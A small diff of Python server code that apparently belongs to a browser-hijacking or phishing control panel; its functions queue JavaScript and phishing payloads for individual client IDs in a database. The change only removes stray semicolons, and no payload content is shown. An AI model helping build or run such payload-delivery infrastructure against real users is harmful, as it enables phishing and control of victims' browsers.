@@ -84,7 +84,7 @@ def add_js_cmd(clientid, pattern, cmd):
                 conn.execute('INSERT INTO PendingPayloads values (%s, %s)', (clientid, payload))
             else:
                 conn.execute('insert into PendingPayloads values (%s, %s) on duplicate key update Payload=(%s)', (clientid, payload, payload))
-    return 'OK';
+    return 'OK'
 
 def add_phish_cmd(clientid, pattern, cmd):
     if(cmd == "1" or cmd == "2"):
@@ -92,7 +92,7 @@ def add_phish_cmd(clientid, pattern, cmd):
         fileP = open(fStr, "r")
         sendcmd = fileP.read()
         add_js_cmd(clientid, pattern, sendcmd)
-    return 'OK';
+    return 'OK'
 
 """
 Handles creation of new client.
